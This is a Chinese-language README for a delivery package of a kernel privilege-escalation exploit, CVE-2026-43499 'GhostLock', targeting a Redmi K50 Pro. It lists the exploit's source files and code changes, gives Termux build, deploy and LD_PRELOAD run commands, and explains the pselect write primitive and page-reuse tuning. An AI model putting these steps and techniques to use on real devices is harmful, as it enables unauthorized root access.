# Page Reuse 融合方案 — 完整交付包

> CVE-2026-43499 GhostLock · Redmi K50 Pro (matisse) · MTK 5.10.209
> 日期: 2026-07-16

---

## 这个目录包含什么

本目录包含本次会话中**所有设计、修改、创建的内容**,集中管理方便后续使用。

---

## 目录结构

```
fusion_release/
│
├── README.md                        ← 本文件 (总览)
├── CHANGELOG.md                     ← 源码变更记录 (diff 格式)
├── Makefile                         ← 已改: Windows/Linux 自适应 + SHA256SUM 变量化
│
├── src/                             ← 全部源码 (改动 + 未改动)
│   ├── common.h                     ← ★已改 +1行: page_reuse_active
│   ├── main.c                       ← ★已改 +24行: fusion 逻辑
│   ├── pipe.c                       ← ★已改 +18行: reuse 分支 + 动态超时
│   ├── fops.c                       ← ★已改 +1条件: retry 跳过
│   ├── util.c                       ← 未改 (原始 R8)
│   ├── slide.c                      ← 未改
│   ├── offset.h                     ← 未改
│   ├── preload.c                    ← 未改
│   ├── root.c                       ← 未改
│   ├── su_daemon.c                  ← 未改
│   ├── su_blob.S                    ← 未改
│   ├── wallpaper_blob.S            ← 未改
│   ├── wallpaper.webp               ← 未改
│   └── target.h                     ← 未改 (matisse 设备配置)
│
├── kernelsnitch/                    ← 内核信息泄漏头文件 (未改)
│   ├── futex_hash.h
│   ├── kernelsnitch.h
│   ├── timeutils.h
│   └── utils.h
│
├── docs/                            ← 文档
│   ├── ghostlock-project-overview.html  ← 项目全览 (含图表, 浏览器打开)
│   ├── CHECKPOINT_FUSION_page_reuse.md  ← 融合方案技术文档
│   ├── TERMUX_BUILD_AND_TEST.md         ← Termux 编译测试一键指南
│   └── PROJECT_INDEX.md                 ← 项目主索引 (所有文件/地址/命令)
│
└── tools/                           ← Windows 构建工具
    ├── sha256sum.cmd                    ← sha256sum 兼容 wrapper
    └── build_windows.cmd                ← Windows 一键构建脚本
```

---

## 改动过的 5 个文件 (★标记)

| 文件 | 变更 | 核心改动 |
|------|------|----------|
| `src/common.h` | +1 行 | `extern int page_reuse_active;` |
| `src/main.c` | +24 行 | 父进程一次性准备 page + reuse 标志管理 |
| `src/pipe.c` | +18 行 | 子进程 reuse 分支 + 60s 动态超时 |
| `src/fops.c` | +1 条件 | retry 循环跳过重新 prepare |
| `Makefile` | +8 行 | Windows prebuilt 检测 + SHA256SUM 变量化 |

详细 diff 见 `CHANGELOG.md`。

---

## 快速上手 (Termux)

```bash
# 1. 把 fusion_release/src/ 覆盖到 exploit 源码目录
cp -r /sdcard/Documents/matisse_backup_essentials/fusion_release/src/* \
      /sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit/src/
cp /sdcard/Documents/matisse_backup_essentials/fusion_release/Makefile \
   /sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit/Makefile

# 2. 编译
cd /sdcard/Documents/matisse_backup_essentials/CyberMeowfia/IonStack/CVE-2026-43499/exploit
rm -rf build/
make PROJECT=blazer-CP2A.260605.012 API=34 CC=clang

# 3. 验证融合代码已编入
strings build/blazer-CP2A.260605.012/bin/preload.so | grep "direct-fusion"

# 4. 复制 + 部署 + 运行
cp build/blazer-CP2A.260605.012/bin/preload.so \
   /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so

rish
bash /sdcard/Documents/matisse_backup_essentials/scripts/deploy.sh \
  /sdcard/Documents/matisse_backup_essentials/preload_mtk_R9.so
LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 30 2>&1 | \
  tee /sdcard/Documents/matisse_backup_essentials/logs/R9_test1.txt
```

详细步骤见 `docs/TERMUX_BUILD_AND_TEST.md`。

---

## 融合方案核心思路

**问题**: R8_test4 首次成功触发写原语,但每次写操作都重新 clone 543 个进程,4-5 次写 = 2700+ 次进程创建,压垮 MTK slab → 重启。

**解决**: kernel page 提供的基础设施 (fake_lock/fake_w0/fake_task) 对所有写操作都相同,per-write 的 target/value 在 pselect fd_set (用户态栈)。一次准备,全部复用。

**效果**: clone 次数 2715 → 543 (减少 80%)。

**剩余风险**: PI chain 腗败累积 (每次 pselect 写在内核 rt_mutex 树留下损坏指针),融合不解决此问题。

---

## 阅读顺序建议

1. `README.md` (本文件) — 总览
2. `docs/ghostlock-project-overview.html` — 浏览器打开,完整项目全览 (含图表)
3. `CHANGELOG.md` — 源码改动详情
4. `docs/CHECKPOINT_FUSION_page_reuse.md` — 融合方案技术文档
5. `docs/TERMUX_BUILD_AND_TEST.md` — 编译测试操作指南
6. `docs/PROJECT_INDEX.md` — 项目全文件索引
